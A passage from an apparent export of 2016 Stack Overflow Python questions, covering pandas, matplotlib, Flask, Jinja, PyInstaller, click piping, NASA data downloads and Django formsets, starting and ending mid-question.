List <code>b</code> is supposed to have <code>n*m</code> element. It is created from list a with cyclic shift k to the right for m elements of lists. 
I know it is poorly explained. Example is:</p>

<pre><code>n=3
m=4
A=1 2 3 4 5 6 7 8 9 10 11 12
k=1
B=4 1 2 3 8 5 6 7 12 9 10 11
</code></pre>

<p>What i have at the moment is:</p>

<pre><code>from random import randint
n = int(input())
m=int(input())

A = []
B=[0]
B=B*n*m
for i in range(n*m):
    A = A + [randint(1, 30)]

print('\nLista A:\n')
for i in range(n*m):
    print(A[i], end = ' ')

print()

k=int(input())

for i in range(-1, m*n, m):
    B[m-1-i]=A[i]
    print(B[m-1-i])

print('\nLista B:\n')
for i in range(n*m):
    print(B[i], end = ' ')
</code></pre>

<p>Thanks</p>
"
39739644,5405782.0,2016-09-28 06:32:59+00:00,2,Stack the lables of an axis with matplotlib,"<p>I'm creating a bar graph and showing multiple values on the x axis. By default they are shown in series with a "","" separating them as shown below. Instead of a coma how could I show the values stacked on top of each other as drawn on the image below? This would save space on the x-axis to allow for bigger graphs when I want to show multiple values. </p>

<pre><code>import pandas as pd
import matplotlib as plt

dfex = pd.DataFrame({'City': ['LA', 'SF', 'Dallas'],
 'Lakes': [3, 9, 6],
 'Rivers': [1, 0, 0],
 'State': ['CA', 'CA', 'TX'],
 'Waterfalls': [2, 4, 5]})

myplot = dfex.plot(x=['City','State'],kind='bar',stacked='True')
</code></pre>

<p><a href=""http://i.stack.imgur.com/RdNuX.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/RdNuX.png"" alt=""enter image description here""></a></p>
"
40033471,308827.0,2016-10-14 01:19:23+00:00,2,Getting SettingWithCopyWarning warning even after using .loc in pandas,"<pre><code>df_masked.loc[:, col] = df_masked.groupby([df_masked.index.month, df_masked.index.day])[col].\
            transform(lambda y: y.fillna(y.median()))
</code></pre>

<p>Even after using a .loc, I get the foll. error, how do I fix it? </p>

<pre><code>Anaconda\lib\site-packages\pandas\core\indexing.py:476: SettingWithCopyWarning: 
A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

See the caveats in the documentation: http://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy
  self.obj[item] = s
</code></pre>
"
40088745,4624988.0,2016-10-17 14:14:02+00:00,2,How to download nasa satellite OPeNDAP data using python,"<p>I have tried requests, pydap, urllib, and netcdf4 and keep either getting redirect errors or permission errors when trying to download the following NASA data:</p>

<p>GLDAS_NOAH025SUBP_3H: GLDAS Noah Land Surface Model L4 3 Hourly 0.25 x 0.25 degree Subsetted V001 (<a href=""http://disc.sci.gsfc.nasa.gov/uui/datasets/GLDAS_NOAH025SUBP_3H_V001/summary?keywords=Hydrology"" rel=""nofollow"">http://disc.sci.gsfc.nasa.gov/uui/datasets/GLDAS_NOAH025SUBP_3H_V001/summary?keywords=Hydrology</a>)</p>

<p>I am attempting to download about 50k files, here is an example of one, which works when pasted into google chrome browser (if you have proper username and password): </p>

<p><a href=""http://hydro1.gesdisc.eosdis.nasa.gov/daac-bin/OTF/HTTP_services.cgi?FILENAME=%2Fdata%2FGLDAS_V1%2FGLDAS_NOAH025SUBP_3H%2F2016%2F244%2FGLDAS_NOAH025SUBP_3H.A2016244.2100.001.2016256190725.grb&amp;FORMAT=TmV0Q0RGLw&amp;BBOX=-11.95%2C28.86%2C-0.62%2C40.81&amp;LABEL=GLDAS_NOAH025SUBP_3H.A2016244.2100.001.2016286201048.pss.nc&amp;SHORTNAME=GLDAS_NOAH025SUBP_3H&amp;SERVICE=SUBSET_GRIB&amp;VERSION=1.02&amp;LAYERS=AAAB&amp;DATASET_VERSION=001"" rel=""nofollow"">http://hydro1.gesdisc.eosdis.nasa.gov/daac-bin/OTF/HTTP_services.cgi?FILENAME=%2Fdata%2FGLDAS_V1%2FGLDAS_NOAH025SUBP_3H%2F2016%2F244%2FGLDAS_NOAH025SUBP_3H.A2016244.2100.001.2016256190725.grb&amp;FORMAT=TmV0Q0RGLw&amp;BBOX=-11.95%2C28.86%2C-0.62%2C40.81&amp;LABEL=GLDAS_NOAH025SUBP_3H.A2016244.2100.001.2016286201048.pss.nc&amp;SHORTNAME=GLDAS_NOAH025SUBP_3H&amp;SERVICE=SUBSET_GRIB&amp;VERSION=1.02&amp;LAYERS=AAAB&amp;DATASET_VERSION=001</a></p>

<p>Anyone have any experience getting OPeNDAP NASA data from the web using python? I am happy to provide more information if desired. </p>

<p>Here is the requests attempt which gives 401 error:</p>

<pre><code>import requests

def httpdownload():
    '''loop through each line in the text file and open url'''
    httpfile = open(pathlist[0]+""NASAdownloadSample.txt"", ""r"")
    for line in httpfile:
        print line 
        outname = line[-134:-122]+"".hdf""
        print outname 
        username = """"
        password = ""*""
        r = requests.get(line, auth=(""username"", ""password""), stream=True)
        print r.text
        print r.status_code
        with open(pathlist[0]+outname, 'wb') as out:
             out.write(r.content)
        print outname, ""finished"" # keep track of progress
</code></pre>

<p>And here is the pydap example which gives redirect error:</p>

<pre><code>import install_cas_client
from pydap.client import open_url

def httpdownload():
    '''loop through each line in the text file and open url'''
    username = """"
    password = """"
    httpfile = open(pathlist[0]+""NASAdownloadSample.txt"", ""r"")
    fileone = httpfile.readline()
    filetot = fileone[:7]+username+"":""+password+""@""+fileone[7:]
    print filetot
    dataset = open_url(filetot)
</code></pre>
"
39736773,6807211.0,2016-09-28 01:48:32+00:00,2,"In python, how to restore the function of os.chdir() if os.chdir = 'path' has been implemented","<p>In path setup, I wrongly wrote the code: os.chdir = '\some path', which turns the function os.chdir() into a string. Is there any quick way to restore the function without restarting the software? Thanks!</p>
"
39734209,6495061.0,2016-09-27 20:59:33+00:00,2,Tokenise line containing string literals,"<p>Using <code>str.split</code> on <code>""print 'Hello, world!' times 3""</code> returns the list <code>[""print"", ""'Hello,"", ""world!'"", ""times"", ""3""]</code>. However, I want the result <code>[""print"", ""'Hello, world!'"", ""times"", ""3""]</code>. How can I do that?</p>
"
40089134,6634981.0,2016-10-17 14:32:33+00:00,2,Difference between GET data as a function parameter and an item from requests.arg,"<p>I would like to know if there is any difference between:</p>

<pre><code>@app.route('/api/users/&lt;int:id&gt;', methods=['GET'])
def get_user(id):
    pass  # handle user here with given id
</code></pre>

<p>and</p>

<pre><code>@app.route('/api/users')
def get_user():
    id = request.args.get('id')
    # handle user here with given id
</code></pre>

<p>Furthermore, is there a way to get multiple parameters in the former? Can they be optional parameters?</p>
"
39734252,854739.0,2016-09-27 21:01:57+00:00,2,Formatting negative fixed-length string,"<p>In <code>python</code>, I'm trying to format a number to be a fixed-length string with leading zeros, which can be done like so:</p>

<pre><code>'{:0&gt;10}'.format('10.0040')
'00010.0040'
</code></pre>

<p>I have a negative number and want to express the negative, I would get this:</p>

<pre><code>'{:0&gt;10}'.format('-10.0040')
'00-10.0040'
</code></pre>

<p>If I wanted to format the string to be:</p>

<pre><code>'-0010.0040'
</code></pre>

<p>how could I do this?  </p>

<p>I could do an if/then, but wondering if format would handle this already. </p>
"
40032408,7016390.0,2016-10-13 23:02:51+00:00,2,Python(jupyter) for prime numbers,"<pre><code>primes=[]
for i in range(3,6):
    is_prime=True
    for j in range(2,i):
        if i%j ==0:
            is_prime=False
    if is_prime=True:
        primes= primes + [i]

primes
</code></pre>

<p>The code seems logical to me but I keep getting a syntax error at the 2nd last sentence <code>if is_prime=True</code>.</p>
"
39736000,2734863.0,2016-09-27 23:51:55+00:00,2,Exception: Cannot find PyQt5 plugin directories when using Pyinstaller despite PyQt5 not even being used,"<p>A month ago I solved my applcation freezing issues for Python 2.7 as you can see <a href=""http://stackoverflow.com/questions/39135408/using-pyinstaller-on-parmap-causes-a-tkinter-matplotlib-import-error-why"">here</a>. I have since adapted my code to python 3.5 (using Anaconda) and it appears to be working.  couldn't get pyinstaller working with Anaconda so switched to trying to generate an .exe using the standard Python 3.5 compiler. I am using the same settings as in the link above (<code>pyinstaller --additional-hooks-dir=. --clean --win-private-assemblies pipegui.py</code>), except I get the following error message instead: </p>

<pre><code>`Exception: Cannot find PyQt5 plugin directories`
</code></pre>

<p><a href=""http://stackoverflow.com/questions/19207746/using-cx-freeze-in-pyqt5-cant-find-pyqt5"">This</a> may be related? Except I'm using Pyinstaller and I don't have a setup.py so don't know how I can make use of the solution there, if at all</p>

<p>I find this error message bizarre because I am not using PyQt5, but PyQt4. Here is the full output:</p>

<pre><code>C:\Users\Cornelis Dirk Haupt\PycharmProjects\Mesoscale-Brain-Explorer\src&gt;pyinstaller --additional-hooks-dir=. --clean --win-private-assemblies pipegui.py
62 INFO: PyInstaller: 3.2
62 INFO: Python: 3.5.0
62 INFO: Platform: Windows-10.0.14393
62 INFO: wrote C:\Users\Cornelis Dirk Haupt\PycharmProjects\Mesoscale-Brain-Explorer\src\pipegui.spec
62 INFO: UPX is not available.
62 INFO: Removing temporary files and cleaning cache in C:\Users\Cornelis Dirk Haupt\AppData\Roaming\pyinstaller
62 INFO: Extending PYTHONPATH with paths
['C:\\Users\\Cornelis Dirk Haupt\\PycharmProjects\\Mesoscale-Brain-Explorer',
 'C:\\Users\\Cornelis Dirk '
 'Haupt\\PycharmProjects\\Mesoscale-Brain-Explorer\\src']
62 INFO: checking Analysis
62 INFO: Building Analysis because out00-Analysis.toc is non existent
62 INFO: Initializing module dependency graph...
62 INFO: Initializing module graph hooks...
62 INFO: Analyzing base_library.zip ...
1430 INFO: running Analysis out00-Analysis.toc
1727 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-math-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1742 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-runtime-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1742 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-locale-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1758 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-stdio-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1758 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-heap-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1774 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-string-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1774 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-environment-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1774 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-time-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1789 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-filesystem-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1789 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-conio-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1789 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-process-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1805 WARNING: Can not get binary dependencies for file: C:\Anaconda3\api-ms-win-crt-convert-l1-1-0.dll
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 695, in getImports
    return _getImports_pe(pth)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\depend\bindepend.py"", line 122, in _getImports_pe
    dll, _ = sym.forwarder.split('.')
TypeError: a bytes-like object is required, not 'str'
1805 INFO: Caching module hooks...
1805 INFO: Analyzing C:\Users\Cornelis Dirk Haupt\PycharmProjects\Mesoscale-Brain-Explorer\src\pipegui.py
1992 INFO: Processing pre-find module path hook   distutils
2055 INFO: Processing pre-safe import module hook   six.moves
3181 INFO: Processing pre-find module path hook   site
3181 INFO: site: retargeting to fake-dir 'c:\\users\\cornelis dirk haupt\\appdata\\local\\programs\\python\\python35\\lib\\site-packages\\PyInstaller\\fake-modules'
4298 INFO: Processing pre-safe import module hook   win32com
9975 INFO: Loading module hooks...
9975 INFO: Loading module hook ""hook-_tkinter.py""...
10121 INFO: checking Tree
10121 INFO: Building Tree because out00-Tree.toc is non existent
10122 INFO: Building Tree out00-Tree.toc
10184 INFO: checking Tree
10184 INFO: Building Tree because out01-Tree.toc is non existent
10185 INFO: Building Tree out01-Tree.toc
10198 INFO: Loading module hook ""hook-matplotlib.py""...
10404 INFO: Loading module hook ""hook-pywintypes.py""...
10526 INFO: Loading module hook ""hook-xml.py""...
10526 INFO: Loading module hook ""hook-pydoc.py""...
10527 INFO: Loading module hook ""hook-scipy.linalg.py""...
10527 INFO: Loading module hook ""hook-scipy.sparse.csgraph.py""...
10529 INFO: Loading module hook ""hook-plugins.py""...
10721 INFO: Processing pre-find module path hook   PyQt4.uic.port_v3
10726 INFO: Processing pre-find module path hook   PyQt4.uic.port_v2
12402 INFO: Loading module hook ""hook-OpenGL.py""...
12583 INFO: Loading module hook ""hook-PyQt4.QtGui.py""...
12802 INFO: Loading module hook ""hook-encodings.py""...
12807 INFO: Loading module hook ""hook-PyQt4.uic.py""...
12812 INFO: Loading module hook ""hook-PyQt5.QtWidgets.py""...
12813 INFO: Loading module hook ""hook-xml.etree.cElementTree.py""...
12813 INFO: Loading module hook ""hook-setuptools.py""...
12814 INFO: Loading module hook ""hook-scipy.special._ufuncs.py""...
12814 INFO: Loading module hook ""hook-PyQt5.QtCore.py""...
Traceback (most recent call last):
  File ""&lt;string&gt;"", line 2, in &lt;module&gt;
ImportError: DLL load failed: The specified procedure could not be found.
Traceback (most recent call last):
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\runpy.py"", line 170, in _run_module_as_main
    ""__main__"", mod_spec)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\runpy.py"", line 85, in _run_code
    exec(code, run_globals)
  File ""C:\Users\Cornelis Dirk Haupt\AppData\Local\Programs\Python\Python35\Scripts\pyinstaller.exe\__main__.py"", line 9, in &lt;module&gt;
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\__main__.py"", line 90, in run
    run_build(pyi_config, spec_file, **vars(args))
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\__main__.py"", line 46, in run_build
    PyInstaller.building.build_main.main(pyi_config, spec_file, **kwargs)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\build_main.py"", line 788, in main
    build(specfile, kw.get('distpath'), kw.get('workpath'), kw.get('clean_build'))
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\build_main.py"", line 734, in build
    exec(text, spec_namespace)
  File ""&lt;string&gt;"", line 16, in &lt;module&gt;
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\build_main.py"", line 212, in __init__
    self.__postinit__()
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\datastruct.py"", line 178, in __postinit__
    self.assemble()
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\build_main.py"", line 470, in assemble
    module_hook.post_graph()
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\imphook.py"", line 409, in post_graph
    self._load_hook_module()
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\building\imphook.py"", line 376, in _load_hook_module
    self.hook_module_name, self.hook_filename)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\compat.py"", line 725, in importlib_load_source
    return mod_loader.load_module()
  File ""&lt;frozen importlib._bootstrap_external&gt;"", line 385, in _check_name_wrapper
  File ""&lt;frozen importlib._bootstrap_external&gt;"", line 806, in load_module
  File ""&lt;frozen importlib._bootstrap_external&gt;"", line 665, in load_module
  File ""&lt;frozen importlib._bootstrap&gt;"", line 268, in _load_module_shim
  File ""&lt;frozen importlib._bootstrap&gt;"", line 693, in _load
  File ""&lt;frozen importlib._bootstrap&gt;"", line 673, in _load_unlocked
  File ""&lt;frozen importlib._bootstrap_external&gt;"", line 662, in exec_module
  File ""&lt;frozen importlib._bootstrap&gt;"", line 222, in _call_with_frames_removed
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\hooks\hook-PyQt5.QtCore.py"", line 15, in &lt;module&gt;
    binaries = qt_plugins_binaries('codecs', namespace='PyQt5')
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\utils\hooks\qt.py"", line 64, in qt_plugins_binaries
    pdir = qt_plugins_dir(namespace=namespace)
  File ""c:\users\cornelis dirk haupt\appdata\local\programs\python\python35\lib\site-packages\PyInstaller\utils\hooks\qt.py"", line 38, in qt_plugins_dir
    raise Exception('Cannot find {0} plugin directories'.format(namespace))
Exception: Cannot find PyQt5 plugin directories
</code></pre>

<p>I will say I also have no clue what to make of the <code>TypeError: a bytes-like object is required, not 'str'</code><a href=""http://stackoverflow.com/questions/33054527/python-3-5-typeerror-a-bytes-like-object-is-required-not-str"">This</a> may be related? I only use binary mode with pickle a handful of times as far as I can tell this is my only usage:</p>

<pre><code>pickle.dump( roiState, open( fileName, ""wb"" ) )
roiState = pickle.load(open(fileName, ""rb""))
</code></pre>

<p>I don't have any errors when I run the application, only getting these errors when trying to generate an .exe using pyinstaller. Why?</p>

<p>Note also that Anaconda3 does pop up in the traceback above (why is it looking for binaries there?) but I:</p>

<ol>
<li>Uninstalled pyinstaller from Anaconda</li>
<li>Am using the standard Python 3.5 (64-bit) compiler</li>
</ol>

<p>Only thing I can think of that may be the culprit is that I'm no longer using the developer version of Pyinstaller (it just flat does not run in Python 3.5). I had to use the developer version to solve my freezing issue <a href=""http://stackoverflow.com/questions/39135408/using-pyinstaller-on-parmap-causes-a-tkinter-matplotlib-import-error-why"">here</a> when my code was written for python 2.7</p>
"
39736716,6890943.0,2016-09-28 01:40:38+00:00,2,List appended in function doesn't work,"<p>This is my class:</p>

<pre><code>from Student import Student
class Class:
    stulist=[]
    def __init__ (self, classname, numstudents):
        self.classname=classname
        self.numstudents=numstudents
    def addStudent(self, stuNum, stuName, stuGrades):
        Class.stulist.append(Student(stuName, stuGrades))
    def getPlace(self):
        print (Class.stulist[0].printLn()) #printLn is function in Student 
        print (Class.stulist[1].printLn())
        print (Class.stulist[2].printLn())
</code></pre>

<p>This is my runner:</p>

<pre><code>from Class import Class

class ClassRunner():
        def main():
            test=Class(""Comp sci 1"", 3)
            test.addStudent(0, ""Jimmy"",""4 - 100 90 80 60"")
            test.addStudent(1, ""Sandy"",""4 - 100 100 80 70"")
            test.addStudent(2,""Fred"",""4 - 50 50 70 68"")
            test.getPlace()
        main()
</code></pre>

<p>my output shows:</p>

<p>Fred = 50 50 70 68</p>

<p>Fred = 50 50 70 68</p>

<p>Fred = 50 50 70 68</p>

<p>But i want it to show:</p>

<p>Jimmy = 100 90 80 60</p>

<p>Sandy = 100 100 80 70</p>

<p>Fred = 50 50 70 68</p>

<p>what am I doing wrong? Thank you!</p>
"
40089526,3298319.0,2016-10-17 14:50:00+00:00,2,Pipe python function's results,"<p>I have functions that return some results. I would like to access those functions as libraries: they will be imported and used in some larger scripts. That is straightforward. However, I would like to use those functions as separate scripts which will output the results to <code>stdout</code> for piping purposes. Does it make sense to write my function this way? </p>

<pre><code>def myfunction(params=(), to_stdout=False): 
  result = whatever_i_want_to_process(params)
  if to_stdout is True:
    sys.stdout.writelines(result)
  return result
</code></pre>

<p>Or are there better, more efficient, and more intuitive ways of doing what I want?</p>

<hr>

<h2>EDIT 1</h2>

<p>To be more specific, each function takes a raw input (either from <code>stdin</code> or a raw string), and adds something to it:</p>

<pre><code>def add_name(content, to_stdout=False): 
    result = content + ""\nadded name""
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result

def add_surname(content, to_stdout=False): 
    result = content + ""\nadded surname""
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result

def add_name_and_surname(content, to_stdout=False):
    result = add_surname(add_name(content))
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result
</code></pre>

<p>So I would like to make use of the two first functions as libraries, nothing to change here, but I'd also like to be able ot call those two functions as shell scripts which results could be piped:</p>

<pre><code>$ echo ""Here is my content"" | add_name
</code></pre>

<p>Is there an pygical approach to do it? Would testing the <code>to_stdout</code> variable make sense in the first place or is it error prone and inefficient?</p>

<p>I am also thinking about using the <code>click</code> library to easily build commands from functions. </p>

<hr>

<h2>EDIT 2</h2>

<p>Using the <code>click</code> library the functions would look like this:</p>

<pre><code>import click
import os, sys

@click.command()
@click.argument('content', required=False)
@click.option('--to_stdout', default=True)
def add_name(content, to_stdout=False):
    if not content:
        content = ''.join(sys.stdin.readlines())
    result = content + ""\n\tadded name""
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result


@click.command()
@click.argument('content', required=False)
@click.option('--to_stdout', default=True)
def add_surname(content, to_stdout=False):
    if not content:
        content = ''.join(sys.stdin.readlines())
    result = content + ""\n\tadded surname""
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result

@click.command()
@click.argument('content', required=False)
@click.option('--to_stdout', default=False)
def add_name_and_surname(content, to_stdout=False):
    result = add_surname(add_name(content))
    if to_stdout is True:
        sys.stdout.writelines(result)
    return result
</code></pre>

<p>This way I am able to generate the three commands ""add_name"", ""add_surname"" and ""add_name_and_surname"" using a <code>setup.py</code> file and <code>pip install --editable .</code> Then I am able to pipe:</p>

<pre><code>$ echo ""original content"" | add_name | add_surname 
original content

    added name
    added surname
</code></pre>

<p>However there is one slight problem I need to solve, when composing with different <code>click</code> commands as functions:</p>

<pre><code>$echo ""original content"" | add_name_and_surname 
Usage: add_name_and_surname [OPTIONS] [CONTENT]

Error: Got unexpected extra arguments (r i g i n a l   c o n t e n t 
)
</code></pre>

<p>I have no idea why I get that result.</p>
"
39738423,6324275.0,2016-09-28 05:02:47+00:00,2,How to make flask jinja use variables from python list as a jinja expression variables,"<p>So I have a list:</p>

<pre><code>ABC = ['{{ row[0] }}','{{ row[1] }}','{{ row[2] }}']
</code></pre>

<p>In HTML template, I want to use each items in list ABC as Jinja expression, how can i do it, here is my HTML table template</p>

<pre><code>{% for row in reports %}
    &lt;tr&gt;
    {% for item in ABC %}
        &lt;td&gt;{{ item }}&lt;/td&gt;
    {% endfor %}
    &lt;/tr&gt;
{% endfor %}
</code></pre>

<p>I tried to remove {{ }} from each item in ABC list, but it didn't work. It seemed like each item in HTML template was treated as a string, can't use by each row in reports.</p>

<p>In HTML page, the table render like this:</p>

<p>Column1      | Column2      | Column3</p>

<p>{{ row[0] }} | {{ row[1] }} | {{ row[2] }}</p>

<p>I want it work like this.</p>

<pre><code>{% for row in reports %}
    &lt;tr&gt;
        &lt;td&gt;{{ row[0] }}&lt;/td&gt;
        &lt;td&gt;{{ row[1] }}&lt;/td&gt;
        &lt;td&gt;{{ row[2] }}&lt;/td&gt;
    &lt;/tr&gt;
{% endfor %}
</code></pre>

<p>Edit: I have change to another solution.</p>
"
39660934,2928156.0,2016-09-23 12:36:21+00:00,2,Error when using importlib.util to check for library,"<p>I'm trying to use the importlib library to verify whether the nmap library is installed on the computer executing the script in Python 3.5.2</p>

<p>I'm trying to use <code>importlib.util.find_spec(""nmap"")</code> but receive the following error.</p>

<pre><code>&gt;&gt;&gt; import importlib
&gt;&gt;&gt; importlib.util.find_spec(""nmap"")
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
AttributeError: module 'importlib' has no attribute 'util'
</code></pre>

<p>Can someone tell me where I'm going wrong?</p>

<p><strong>EDIT</strong></p>

<p>I was able to get the function to work using the following code.</p>

<pre><code>#!/usr/bin/pythonw

import importlib
from importlib import util

#check to see if nmap module is installed
find_nmap = util.find_spec(""nmap"")
if find_nmap is None:
    print(""Error"")
</code></pre>
"
40032909,7016451.0,2016-10-14 00:01:39+00:00,2,for loop right-triangles not separating,"<pre><code>base=int(input(""Enter the triangle size: ""))
for i in range(1, base + 1):
    print (('*' * i) + (' ' * (base - i)))
for i in range(1, base + 1)[::-1]:
    print (('*' * i) + (' ' * (base - i)))
for i in range(1, base + 1):
    print (' ' * (base - i) + ('*' * i))
for i in range(1, base + 1)[::-1]:
    print (' ' * (base - i) + ('*' * i))
</code></pre>

<p>The output looks like this: </p>

<pre><code>Enter the triangle size: 4
*   
**  
*** 
****
****
*** 
**  
*   
   *
  **
 ***
****
****
 ***
  **
   *
&gt;&gt;&gt; 
</code></pre>

<p>But I need it to look like this: </p>

<pre><code>Enter the triangle size: 4
*   
**  
*** 
****

****
*** 
**  
*   
   *
  **
 ***
****

****
 ***
  **
   *
&gt;&gt;&gt; 
</code></pre>

<p>I tried everything to create a new line after each for loop but it just outputted a mess. Is there any way I can tweak my program to allow for those spaces? Thanks!</p>
"
39736053,6890701.0,2016-09-28 00:00:31+00:00,2,Editing a table entry that has a foreign key with inlineformset_factory and Jquery AJAX,"<p>I have been working on an simple address book app in Django.  Id like to have a single Contact name with any number of Address connected to that contact via a foreign key...straightforward enough.  </p>

<p>My issue is that when the inlineformset is POST 'd to the server, it always adds a new table entry, despite the fact that the form was loaded and initialized correctly.</p>

<p>Example, if a Contact has a work address and a home address, and I try to 'edit' the existing work address...the POST view creates a second work address with the all the updated info, the original entry I was trying to edit is still present, untouched.  Here is my code...what am I missing.</p>

<pre><code>Model.py

